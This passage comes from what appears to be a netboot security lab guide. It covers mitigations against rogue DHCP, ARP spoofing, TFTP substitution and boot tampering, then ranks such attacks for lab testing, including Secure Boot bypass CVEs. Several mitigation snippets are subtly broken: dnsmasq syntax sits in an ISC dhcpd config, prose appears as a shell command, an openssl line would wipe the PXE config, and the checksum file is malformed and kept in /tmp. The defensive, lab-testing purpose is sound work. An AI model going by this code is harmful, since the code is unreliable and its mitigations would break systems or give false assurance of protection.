cat "$RESULTS_FILE"
```

**Run the lab test**:

```bash
chmod +x /tmp/netboot_security_lab_test.sh
sudo /tmp/netboot_security_lab_test.sh
```

---

## 10. Mitigation Strategies

### 10.1 Network-Level Protections

| Vulnerability | Mitigation |
|---|---|
| **DHCP Starvation** | Rate limiting, MAC binding, authorized MAC lists |
| **Rogue DHCP** | DHCP snooping on switch, DAI (Dynamic ARP Inspection) |
| **ARP Poisoning** | Static ARP entries, ARP monitoring |
| **TFTP Poisoning** | Network segmentation, firewall rules, TFTP signed transfers |

**Implementation**:

```bash
# 1. DHCP Rate Limiting (ISC DHCP)
cat >> /etc/dhcp/dhcpd.conf << 'EOF'
# Rate limiting
max-lease-time 7200;
default-lease-time 3600;

# Authorized MAC list
option client-architecture "01:00";

# Failover protection
failover peer "failover-peer" { ... }
EOF

# 2. Network Segmentation
# PXE/boot traffic on isolated VLAN
# Example (netplan):
cat > /etc/netplan/01-netcfg.yaml << 'EOF'
network:
  vlans:
    vlan100:
      id: 100
      link: eth0
      dhcp4: no
      addresses:
        - 192.168.100.10/24
EOF

# 3. Firewall Rules
sudo ufw allow from 192.168.100.0/24 to 192.168.100.10 port 67
sudo ufw allow from 192.168.100.0/24 to 192.168.100.10 port 69
sudo ufw deny from any to 192.168.100.10 port 67
sudo ufw deny from any to 192.168.100.10 port 69
```

### 10.2 Boot-Level Protections

| Component | Mitigation |
|---|---|
| **Bootloader** | Sign with bootloader-specific key, verify signatures |
| **Kernel** | Sign kernel, enable Secure Boot verification |
| **Initramfs** | Sign initramfs, embed public key in kernel, verify at load time |
| **Config Files** | Encrypt config, store checksums centrally |

**Implementation**:

```bash
# 1. Generate signing keys
openssl genrsa -out /tmp/boot_key.pem 4096
openssl req -new -x509 -key /tmp/boot_key.pem -out /tmp/boot_cert.pem

# 2. Sign bootloader (GRUB EFI)
grub-mkimage -O x86_64-efi -o grubx64.efi.signed \
    -c /tmp/grub_signed.cfg grub core

# 3. Sign kernel
kexec-tools can verify kernel signatures

# 4. Create signed initramfs
# (Complex; typically requires dracut/mkinitramfs modifications)

# 5. Store checksums on secured server
cat > /tmp/boot_checksums.txt << 'EOF'
sha256sum pxelinux.0: abc123...
sha256sum vmlinuz: def456...
sha256sum initrd.img: ghi789...
EOF

# Periodically verify
sha256sum -c /tmp/boot_checksums.txt
```

### 10.3 Configuration Protections

```bash
# 1. Restrict DHCP options
# In /etc/dhcp/dhcpd.conf:
dhcp-option=66,192.168.1.10;  # Only this TFTP server
dhcp-option=67,pxelinux.0;    # Only this bootloader

# 2. Whitelist by MAC
host trusted_client {
    hardware ethernet aa:bb:cc:dd:ee:01;
    fixed-address 192.168.1.101;
    next-server 192.168.1.10;
    filename "pxelinux.0";
}

# 3. Encrypt config files
cat > /srv/tftp/pxelinux.cfg/default | openssl enc -aes-256-cbc > default.enc

# 4. Store configs on read-only mount
mount /mnt/pxe -o ro
# Require privileged mount to modify
```

### 10.4 Monitoring & Detection

```bash
# 1. Real-time DHCP/TFTP monitoring
sudo tcpdump -i eth0 "port 67 or port 68 or port 69" -w netboot.pcap
# Analyze with Wireshark or tshark

# 2. File integrity monitoring (AIDE)
sudo aideinit
sudo aide --check

# 3. Log analysis
grep "DHCP\|TFTP" /var/log/syslog | tail -100

# 4. IDS/IPS rules
# (Suricata, Snort) - alert on suspicious DHCP/TFTP traffic

# 5. Secure boot verification
# On each boot:
mokutil --sb-state
efivar -l | grep -i secure

# 6. Checksums on boot
# Create startup script that verifies all boot components
cat > /etc/init.d/verify_boot_integrity << 'EOF'
#!/bin/bash
SHA=$(sha256sum /boot/vmlinuz /boot/initrd.img)
STORED=$(cat /tmp/boot_checksums.txt)

if [ "$SHA" != "$STORED" ]; then
    echo "ALERT: Boot files modified!" | logger
    # Notify admin, halt system, etc.
fi
EOF
```

---

## Summary: Attack Feasibility & Risk Assessment

| Attack | Difficulty | Risk | Lab-Testable |
|--------|-----------|------|--------------|
| ARP Spoofing | Easy | High | ✓ |
| DHCP Starvation | Easy | Medium | ✓ |
| Rogue DHCP | Easy | Critical | ✓ |
| TFTP MitM | Easy | Critical | ✓ |
| Bootloader Substitution | Medium | Critical | ✓ |
| Initramfs Injection | Medium | Critical | ✓ |
| Debug Shell Exploitation | Easy | Critical | ✓ |
| Secure Boot Bypass (CVE-2025-3052) | Hard | Critical | ✗ (requires vuln firmware) |
| Shim Chain-Load (CVE-2023-40547) | Medium | Critical | ✓ (if vulnerable shim) |

**Recommended Lab Priority** (start here):

1. **DHCP Starvation** (easy, shows protocol weakness)
2. **Rogue DHCP Server** (easy, enables MitM)
3. **ARP Spoofing** (easy, foundational MitM technique)
4. **TFTP File Substitution** (easy, direct bootloader compromise)
5. **Initramfs Injection** (medium, practical root compromise)
6. **Debug Shell Exploitation** (easy, emergency access vector)

Once you confirm these work, your netboot architecture is testable against real attack scenarios. Then implement mitigations from Section 10 and re-test to verify defenses.
